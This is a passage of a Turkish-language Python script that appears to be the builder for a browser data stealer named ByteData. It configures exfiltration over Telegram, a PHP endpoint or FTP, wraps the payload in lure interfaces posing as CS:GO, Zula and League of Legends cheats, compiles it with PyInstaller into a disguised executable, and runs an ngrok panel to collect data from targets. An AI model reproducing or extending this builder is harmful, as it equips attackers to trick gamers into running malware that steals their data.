                                        if input(f"\n\tURL'yi kaydetmek istermisin {yesil}E{normal} | {kirmizi}H{normal} ") == "h":
                                            pass
                                        else:
                                            with open("data/php.py","w") as yaz:yaz.write(f"url='{url}'")
                                        kod = "exit"
                                        break
                                    else:
                                        print("URL : "+kontrol)
                                        print(sari+"\n\t404 dönmedi lakin aradığımız OK yazısına da erişemedik"+normal)
                                        print("\tSunucuna bir göz gezdir . bytedata/test.php adında bir dosya oluşmuş olmalı !")
                                        if input(f"""\n\t{kirmizi}URL onaylansın mı{normal} [E ile herşey yolundaymış ile devam edilecek !]\n\tE | {kirmizi}H{normal} : """).strip().lower() == "e":kod="exit";break
                                        else:pass    
                                except Exception as hata:
                                    input(f"\t{kirmizi}Hata ile karşılaşıldı : {normal} \n\t{hata}")
                    else:
                        kod = "exit"
                        break
                if kod == "exit":break
            elif ag == base64.b64decode(b"ZGV2").decode():input(b'\xff\xfe\n\x00\t\x00B\x00a\x00h\x00s\x00e\x00t\x00t\x00i\x00\x1f\x01i\x00m\x00 \x00P\x00H\x00P\x00 \x00k\x001\x01s\x00m\x001\x01 \x00t\x00a\x00m\x00 \x00b\x00u\x00r\x00a\x00d\x00a\x00 \x00d\x00e\x00v\x00r\x00e\x00y\x00e\x00 \x00g\x00i\x00r\x00i\x00y\x00o\x00r\x00 \x00!\x00\t\x00'.decode("utf16"))


    elif yol == "ftp":
        from data import ftp
        import ftplib
        ftp_host = ftp.ftp_host
        ftp_username = ftp.ftp_username
        ftp_pass = ftp.ftp_pass
        if not ftp_host or not ftp_username or not ftp_pass:
            while 1:
                ts()
                #print("""\nFTP bilgilerinizi giriniz\n""")
                ftp_host = input("\t  FTP Adresi : ")
                ftp_username = input("\t  FTP Kullanıcı Adı : ")
                ftp_pass = input("\t  FTP Şifresi : ")
                if not ftp_host or not ftp_username or not ftp_pass:
                    print(kirmizi+"\n\t  Ftp bilgileri nasıl boş olabilir  ?"+normal)
                    time.sleep(2)
                else:
                    try:
                        ftp_sunucu=ftplib.FTP(ftp_host,ftp_username,ftp_pass)
                        ftp_sunucu.close()
                        if input(f"\n\t{yesil}FTP bilgileri doğrulandı .{normal} Kayıt etmek istermisiniz ? {yesil}E{normal} | {kirmizi}H{normal} :").strip().lower() == "h":pass
                        else:
                            with open("data/ftp.py","w") as yaz:
                                yaz.write(f'ftp_host="{ftp_host}"\nftp_username="{ftp_username}"\nftp_pass="{ftp_pass}"')
                    except Exception as hata:
                        input(kirmizi+"\n\tFTP bilgileri doğrulanamadı !\n\n"+normal+"\tHata :\n\t"+str(hata))
        else:
            ts()
            if input(f"""
            FTP HOST = {ftp_host}
            FTP USER = {ftp_username}
            FTP PASS = {ftp_pass}
            
            Bu bilgileri kullanmak istermisiniz ? {yesil}E{normal} | {kirmizi}H{normal} """).strip().lower() == "h":
                while 1:
                    ts()
                    ftp_host = input("\t  FTP Adresi : ")
                    ftp_username = input("\t  FTP Kullanıcı Adı : ")
                    ftp_pass = input("\t  FTP Şifresi : ")
                    if not ftp_host or not ftp_username or not ftp_pass:
                        print(kirmizi+"\n\t  Ftp bilgileri nasıl boş olabilir  ?"+normal)
                        time.sleep(2)
                    else:
                        try:
                            ftp_sunucu=ftplib.FTP(ftp_host,ftp_username,ftp_pass)
                            ftp_sunucu.close()
                            if input(f"\n\t{yesil}FTP bilgileri doğrulandı .{normal} Kayıt etmek istermisiniz ? {yesil}E{normal} | {kirmizi}H{normal} :").strip().lower() == "h":pass
                            else:
                                with open("data/ftp.py","w") as yaz:
                                    yaz.write(f'ftp_host="{ftp_host}"\nftp_username="{ftp_username}"\nftp_pass="{ftp_pass}"')
                        except Exception as hata:
                            input(kirmizi+"\n\tFTP bilgileri doğrulanamadı !\n\n"+normal+"\tHata :\n\t"+str(hata))

    ts()
    print(f"""
        {sari}Bilgiler :{normal}

        Tarayıcı  : {tip}
        Arayuz    : {arayuz}
        Ulaşım    : {yol}
        """)
    if yol == "telegram":
        print(f"id = {tg_id} token = {tg_token}")
    elif yol == "php":
        print(f"\tURL = {url}")
    elif yol == "ftp":
        print(f"""
        ftp_host = {ftp_host}
        ftp_user = {ftp_username}
        ftp_pass = {ftp_pass}""")


    from data import action,injection
    if arayuz == "default":
        action.default(tip=tip,arayuz=arayuz,yol=yol,id=tg_id,token=tg_token,ftp_host=ftp_host,ftp_username=ftp_username,ftp_pass=ftp_pass,url=url,sistem=sistem,yesil=yesil,normal=normal)
    elif arayuz == "csgo_hack":
        action.csgo_hack(tip=tip,arayuz=arayuz,yol=yol,id=tg_id,token=tg_token,ftp_host=ftp_host,ftp_username=ftp_username,ftp_pass=ftp_pass,url=url,sistem=sistem,yesil=yesil,normal=normal)
    elif arayuz == "zula_hack":
        action.zula_hack(tip=tip,arayuz=arayuz,yol=yol,id=tg_id,token=tg_token,ftp_host=ftp_host,ftp_username=ftp_username,ftp_pass=ftp_pass,url=url,sistem=sistem,yesil=yesil,normal=normal)
    elif arayuz == "lol_hack":
        action.lol_hack(tip=tip,arayuz=arayuz,yol=yol,id=tg_id,token=tg_token,ftp_host=ftp_host,ftp_username=ftp_username,ftp_pass=ftp_pass,url=url,sistem=sistem,yesil=yesil,normal=normal)
    elif arayuz == "injection":
        injection.injection(injection=injection1,tip=tip,arayuz=arayuz,yol=yol,id=tg_id,token=tg_token,ftp_host=ftp_host,ftp_username=ftp_username,ftp_pass=ftp_pass,url=url,sistem=sistem,yesil=yesil,normal=normal)

    while 1:
        ts()
        if not input(f"\tVarsayılan iconlar kullanılsın mı {yesil}E{normal} | {kirmizi}H{normal} : ").strip().lower() == "h":
            icon = "icons/"+arayuz+".ico"
            break
        else:
            while 1:
                try:
                    ts()
                    print("\tEXEC dosyasına ico'unumuzu enjekte edeceğiz ..")
                    py_yolu=input(camgoz+"\n\t.ico tam yolu : "+normal)
                    if py_yolu:
                        if not py_yolu.endswith(".ico"):
                            input(kirmizi+"\tSadece .ico dosyalar kabul edilebilir ! "+normal)
                        else:
                            if not os.path.exists(py_yolu):
                                print(kirmizi+"\n\tGirdiğiniz konumda aranan .ico bulunamadı !"+normal)
                                if not "/" in py_yolu and not "\\" in py_yolu:
                                    print("\n\tEnjekte edilecek iconları ByteData klasörüne atmanızı önermiyoruz ! ")
                                    print(yesil+"\n\tKlasördeki iconlar : "+normal)
                                    for i in [i for i in os.listdir(konum) if i.endswith(".ico")]:
                                        print("\t"+i)
                                    input()
                                elif "/" in py_yolu:
                                    print(yesil+"\n\tKlasördeki iconlar : "+normal)
                                    for i in [i for i in os.listdir(py_yolu.rstrip(py_yolu[py_yolu.rfind("/"):])) if i.endswith(".ico")]:
                                        print("\t"+i)
                                    input()

                                elif "\\" in py_yolu:
                                    print(yesil+"\n\tKlasördeki iconlar : "+normal)
                                    for i in [i for i in os.listdir(py_yolu.rstrip(py_yolu[py_yolu.rfind("\\"):])) if i.endswith(".ico")]:
                                        print("\t"+i)
                                    input()
                            else:
                                icon = py_yolu
                                kod = "exit1"
                                break
                                
                except FileNotFoundError:input(sari+"\n\tBöyle bir dosya yok !"+normal)
                except PermissionError:input(sari+"\n\tErişim izni reddedildi !"+normal)
                except Exception as hata:print("Bilinmeyen hata ! :\n\t"+hata);raport(hata);exit0()
            break

    ts()
    py_compile.compile(f"{arayuz}_{tip}_{yol}.pyw",f"dist/{arayuz}_{tip}_{yol}.pyc")
    os.system(f"pyinstaller --onefile -i {icon} {arayuz}_{tip}_{yol}.pyw")
    ts()
    print(f"\t{kirmizi}Unutmayın ;{normal}\n\tDerlenmiş python dosyasını (.pyc) sadece sizinle aynı sürüm Python kullanan kişiler çalıştırabilirken\n\tPyInstaller ile exec dosya haline getirilen Python dosyaları sizinle\n\t\taynı işletim sistemini kullanan kişiler tarafından çalıştırılabilir\n\n\tPython sürümünüz : {sys.version_info.major}.{kirmizi}{sys.version_info.minor}{normal}")
    time.sleep(2)
    print(f"\n\tPython{sys.version_info.major}.{sys.version_info.minor} ile çalışabilen .pyc dosyası : dist/{arayuz}_{tip}_{yol}.pyc")
    if sistem == "Windows":
        print(f"\t.exe dosyası dist\\'in içerisine yazıldı : {arayuz}_{tip}_{yol}.exe\n\n\tPYC : {konum}\\dist\\{arayuz}_{tip}_{yol}.pyc\n\tEXE : {konum}\\dist\\{arayuz}_{tip}_{yol}.exe")
    elif sistem == "Linux":
        print(f"\tELF dosyası dist/ 'in içerisine yazıldı : {arayuz}_{tip}_{yol}\n\n\tPYC : {konum}/dist/{arayuz}_{tip}_{yol}.pyc\n\tELF : {konum}/dist/{arayuz}_{tip}_{yol}")

    input(f"\n\t{kirmizi}Anlıyorum , devam et [{normal}Enter{kirmizi}]"+normal)
    #################################################################################3
    shutil.move(f"{arayuz}_{tip}_{yol}.pyw",f"dist/{arayuz}_{tip}_{yol}.pyw")
    os.remove(f"{arayuz}_{tip}_{yol}.spec")
    #################################################################################3
    if yol == "php" and url.endswith("ngrok.io"):
        ts("\t\tP A N E L ~")
        print("\tUnutmayın ! ByteData Panel'i panel.py'dan birkez daha başlatabilirsiniz lakin ngrok linkleri eşsizdir .\n\tYanlızca bir kez aynı linki alabilrsiniz . Ngrok'u kapatırsanız hedefe giden programın hiçbir değeri kalmayacaktır ..")
        while 1:
            try:
                while 1:
                    try:
                        pass
                    except KeyboardInterrupt:
                        if input(kirmizi+"\n\tÇıkmak Istermisin ?"+normal+f"\n\tÇıkış yaptığın takdirde ngrok çalışmaya devam edecek lakin flask çalışmayı durduracaktır !\n\n\t[{isim}] [ {kirmizi}E{normal} | {yesil}H{normal} ] : ").strip().lower() == "e":sys.exit()
                        else:
                            ts("")
                            print("\t* ByteData Panel ile bağlantınız koparsa\n\t'panel.py'dan tekrar bağlantı kurabilirsiniz !")
            except SystemExit:exit0()
            except:pass
    else:
        ts()
        print(f"\tdist/'in içine {arayuz}_{tip}_{yol}'a yazıldı .  \n\n\tYeterki Bilgi Yayalım Virus Değil :)")
        time.sleep(2)
        sys.exit()

except KeyboardInterrupt:exit0()
except SystemExit:sys.exit()
except Exception as hata:
    print(kirmizi+"\n\tHata yakalandı !"+normal+" Incelemeniz için : \n\t"+str(hata))
    raport(hata)
    exit0()
